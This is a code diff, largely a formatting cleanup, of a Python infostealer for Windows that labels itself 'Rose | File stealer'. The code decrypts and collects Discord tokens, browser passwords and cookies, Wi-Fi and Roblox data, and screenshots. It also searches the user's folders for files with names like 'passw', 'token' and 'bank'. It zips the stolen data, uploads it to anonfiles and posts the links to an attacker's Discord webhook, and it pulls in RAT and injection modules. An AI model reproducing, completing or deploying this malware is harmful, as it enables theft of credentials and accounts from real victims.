@@ -1,50 +1,71 @@
+import sys
+
+import _webhook
 import discordc
-import injection
 import informations
 import malicious
-import sys
+import rat
+from config import Config
+
+import injection
+
 ii = informations.Info()
-import _webhook
 _webh = _webhook.WebhookX()
-from config import Config 
 cc = Config()
-import rat 
 
 try:
-    import os
-    import threading
-    import re
-    import time
-    import shutil
-    import random
-    import subprocess
-    import platform
-    import socket
     import getpass
-    import requests
-    import psutil
-    from PIL import ImageGrab
+    import os
+    import platform
+    import random
+    import re
+    import shutil
+    import socket
+    import subprocess
+    import threading
+    import time
     from base64 import b64decode
+    from ctypes import (POINTER, Structure, byref, c_buffer, c_char, cdll,
+                        windll, wintypes)
+    from json import dumps
+    from json import loads
     from json import loads as json_loads
-    from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-    from sys import executable, argv
     from sqlite3 import connect as sql_connect
+    from sys import argv, executable
     from urllib.request import Request, urlopen
-    from json import loads, dumps
     from zipfile import ZipFile
-    from Crypto.Cipher import AES
-    import dhooks
+
     import browser_cookie3
-    from anonFile import uploadToAnonfiles
+    import dhooks
+    import psutil
+    import requests
     from _roblox import RobloxX
+    from anonFile import uploadToAnonfiles
+    from Crypto.Cipher import AES
+    from PIL import ImageGrab
 except Exception:
     import subprocess
-    requirements = ["requests", "Pillow", "pycryptodome", "psutil", "WMI", "discord", "dhooks", "browser_cookie3"]
-    command = " ".join([f"python -m pip install {requirement} &&" for requirement in requirements])[0:-3] # the [0:-3] removes the leading " &&"
+
+    requirements = [
+        "requests",
+        "Pillow",
+        "pycryptodome",
+        "psutil",
+        "WMI",
+        "discord",
+        "dhooks",
+        "browser_cookie3",
+    ]
+    # the [0:-3] removes the leading " &&"
+    command = " ".join([
+        f"python -m pip install {requirement} &&"
+        for requirement in requirements
+    ])[0:-3]
     subprocess.run(command, shell=True)
 
 if platform.system() != "Windows":
     exit()
+
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
@@ -54,7 +75,7 @@ def writeforfile(data, name):
             if line[0] != "":
                 f.write(f"{line}\n")
 
-                
+
 webhook = cc.get_webhook()
 debug_mode = cc.get_debug_mode()
 wh_avatar = cc.get_avatar()
@@ -69,10 +90,22 @@ startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 Threadlist = []
 DETECTED = False
 
-
-payload1 = {"content": "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||", "username": wh_name, "avatar_url": wh_avatar}
-payload2 = {"content": "https://cdn.discordapp.com/emojis/1084901411768238190.gif", "username": wh_name, "avatar_url": wh_avatar}
-payload3 = {"content": "https://cdn.discordapp.com/emojis/1084901431531798641.gif", "username": wh_name, "avatar_url": wh_avatar}
+payload1 = {
+    "content":
+    "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||",
+    "username": wh_name,
+    "avatar_url": wh_avatar,
+}
+payload2 = {
+    "content": "https://cdn.discordapp.com/emojis/1084901411768238190.gif",
+    "username": wh_name,
+    "avatar_url": wh_avatar,
+}
+payload3 = {
+    "content": "https://cdn.discordapp.com/emojis/1084901431531798641.gif",
+    "username": wh_name,
+    "avatar_url": wh_avatar,
+}
 response = requests.post(webhook, json=payload1)
 response = requests.post(webhook, json=payload2)
 response = requests.post(webhook, json=payload3)
@@ -113,7 +146,8 @@ def DecryptValue(buff, master_key=None):
         decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
-    
+
+
 def Reformat(listt):
     e = re.findall("(\w+[a-z])", listt)
     while "https" in e:
@@ -124,7 +158,9 @@ def Reformat(listt):
         e.remove("net")
     return list(set(e))
 
+
 Passw = []
+
 
 def LoadUrlib(webhook, data="", files="", headers=""):
     if headers != "":
@@ -147,41 +183,43 @@ def Trust(Cookies):
     DETECTED = False
     return DETECTED
 
+
 dclass = discordc.DiscordX()
+
 
 def upload(name, link):
     headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
     }
-    
-    if name == 'kiwi':
-        data = {
-            'content':'',
-            'embeds':[
-                {
-                    'color':3449140,
-                    'fields':[
-                        {
-                            'name':'Interesting files found on user PC:',
-                            'value': link
-                        }
-                    ],
-                    'author':{
-                        'name':'Rose | File stealer'
-                    },
-                    "footer": {
-                            "text": eb_footer,
-                            "icon_url": "",
-                    },
-                }
-            ],
-            'avatar_url': wh_avatar,
-            'attachments':[]
-        }
-        LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
-        return
 
+    if name == "kiwi":
+        data = {
+            "content":
+            "",
+            "embeds": [{
+                "color":
+                3449140,
+                "fields": [{
+                    "name": "Interesting files found on user PC:",
+                    "value": link
+                }],
+                "author": {
+                    "name": "Rose | File stealer"
+                },
+                "footer": {
+                    "text": eb_footer,
+                    "icon_url": "",
+                },
+            }],
+            "avatar_url":
+            wh_avatar,
+            "attachments": [],
+        }
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+        return
 
     if name == "wpcook":
         rb = "  -  ".join(da for da in cookiWords)
@@ -238,8 +276,10 @@ def upload(name, link):
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         return
 
+
 Tokens = ""
 dclass = discordc.DiscordX()
+
 
 def GetTokens(path, arg):
     if not os.path.exists(path):
@@ -339,14 +379,13 @@ def GetDiscord(path, arg):
                     global Tokens
                     tokenDecoded = DecryptValue(
                         b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
-                    if (
-                        dclass.checkToken(tokenDecoded)
-                        and tokenDecoded not in Tokens
-                    ):
+                    if dclass.checkToken(
+                            tokenDecoded) and tokenDecoded not in Tokens:
                         # print(token)
                         Tokens += tokenDecoded
                         # writeforfile(Tokens, 'tokens')
                         dclass.uploadToken(tokenDecoded)
+
 
 def ZipTelegram(path, arg, procc):
     global OtherZip
@@ -363,14 +402,16 @@ def ZipTelegram(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    lnik = uploadToAnonfiles(f"{pathC}/{name}.zip")
     os.remove(f"{pathC}/{name}.zip")
     df = dhooks.Webhook(webhook)
     df.send(lnik)
     OtherZip.append([arg, lnik])
-    
-Cookies = []    
-    
+
+
+Cookies = []
+
+
 def GetCookies(path, arg):
     global Cookies, CookiCount
     if not os.path.exists(path):
@@ -457,13 +498,13 @@ def ZipThings(path, arg, procc):
             zf.write(pathC + "/" + file)
     zf.close()
 
-    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
+    lnik = uploadToAnonfiles(f"{pathC}/{name}.zip")
     os.remove(f"{pathC}/{name}.zip")
-    
+
     ef = dhooks.Webhook(webhook)
     ef.send(lnik)
-    
-    
+
+
 def GatherAll():
     browserPaths = [
         [
@@ -574,12 +615,12 @@ def GatherAll():
             a = threading.Thread(target=GetTokens, args=[patt[0], patt[2]])
             a.start()
             Threadlist.append(a)
-        
+
         for patt in discordPaths:
             a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
             a.start()
             Threadlist.append(a)
-            
+
     if cc.get_password_stealing() is True:
         for patt in browserPaths:
             a = threading.Thread(target=GetPasswords, args=[patt[0], patt[3]])
@@ -587,22 +628,23 @@ def GatherAll():
             Threadlist.append(a)
 
         for patt in browserPaths:
-            threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
+            threading.Thread(target=ZipThings,
+                             args=[patt[0], patt[5], patt[1]]).start()
 
         for patt in PathsToZip:
-            threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
+            threading.Thread(target=ZipThings,
+                             args=[patt[0], patt[2], patt[1]]).start()
 
-    
     if cc.get_cookie_stealing() is True:
         for patt in browserPaths:
             a = threading.Thread(target=GetCookies, args=[patt[0], patt[4]])
             a.start()
             Threadlist.append(a)
-        
+
     DETECTED = Trust(Cookies)
     if DETECTED is True:
         return
-    
+
     # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
 
     for thread in Threadlist:
@@ -611,8 +653,9 @@ def GatherAll():
     upths = []
 
     if cc.get_password_stealing() is True:
-        upload("wppassw", uploadToAnonfiles(os.getenv("TEMP") + "\\wppassw.txt"))
-        
+        upload("wppassw",
+               uploadToAnonfiles(os.getenv("TEMP") + "\\wppassw.txt"))
+
     if cc.get_cookie_stealing() is True:
         upload("wpcook", uploadToAnonfiles(os.getenv("TEMP") + "\\wpcook.txt"))
 
@@ -664,7 +707,7 @@ def Kiwi():
     path2search = [
         user + "\\Desktop", user + "\\Downloads", user + "\\Documents"
     ]
-    
+
     key_wordsFiles = [
         "passw",
         "mdp",
@@ -689,7 +732,7 @@ def Kiwi():
         "token",
         "backup",
         "secret",
-        "bank"
+        "bank",
     ]
 
     wikith = []
@@ -756,7 +799,7 @@ OtherZip = []
 
 GatherAll()
 
-    
+
 def send_malicious():
     username = getpass.getuser()
     hostname = socket.gethostname()
@@ -775,7 +818,8 @@ def send_malicious():
         "fields": [
             {
                 "name": "User",
-                "value": f"```Host Name: {hostname}\n\nUsername: {username}```",
+                "value":
+                f"```Host Name: {hostname}\n\nUsername: {username}```",
                 "inline": True,
             },
             {
@@ -788,8 +832,8 @@ def send_malicious():
     }
 
     requests.post(webhook, json={"embeds": [embed]})
-    
-    malicious.wifigr(webhook=webhook)
+
+    malicious.wifigr()
 
 
 screenshot = ImageGrab.grab()
@@ -804,7 +848,6 @@ if cc.get_password_stealing() is True:
     for thread in wikith:
         thread.join()
 
-
     filetext = "\n"
     for arg in KiwiFiles:
         if len(arg[2]) != 0:
@@ -818,7 +861,7 @@ if cc.get_password_stealing() is True:
                 b = ffil[1]
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
-            
+
     print(filetext)
     upload("kiwi", filetext)
 
@@ -827,7 +870,7 @@ if cc.get_malicious_stealing() is True:
 
 if cc.get_injection() is True:
     injection.InjectionX(webhook)
-    
+
 if cc.get_roblox_stealing() is True:
     RobloxX().run()
 
